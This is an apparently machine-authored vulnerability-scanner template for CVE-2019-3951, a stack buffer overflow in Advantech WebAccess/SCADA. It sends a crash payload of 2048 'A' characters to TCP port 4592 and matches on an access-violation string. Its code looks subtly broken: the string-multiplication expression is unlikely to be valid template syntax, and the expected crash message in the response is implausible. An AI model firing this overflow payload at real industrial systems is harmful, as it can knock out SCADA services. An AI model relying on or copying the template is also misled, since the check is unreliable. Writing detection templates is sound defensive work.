id: CVE-2019-3951

info:
  name: Advantech WebAccess/SCADA Stack Buffer Overflow
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Advantech WebAccess before 8.4.3 allows unauthenticated remote attackers to execute arbitrary code or cause a denial of service (memory corruption) due to a stack-based buffer overflow when handling IOCTL 70533 RPC messages.
  impact: |
    Remote code execution leading to potential system compromise.
  remediation: |
    Apply the necessary patch provided by Advantech to mitigate the vulnerability.
  reference:
    - https://www.tenable.com/security/research/tra-2019-52
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-3951
    cwe-id: CWE-121,CWE-787
    epss-score: 0.01699
    epss-percentile: 0.88259
    cpe: cpe:2.3:a:advantech:webaccess:*:*:*:*:*:*:*:*
  metadata:
    vendor: advantech
    product: webaccess
tcp:
  - inputs:
      - data: "{{hex_encode('70533' + 'A' * 2048)}}"
    host:
      - "{{Hostname}}"
    port: 4592
    read-size: 1024

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Access violation at address 0x41414141"
        part: data
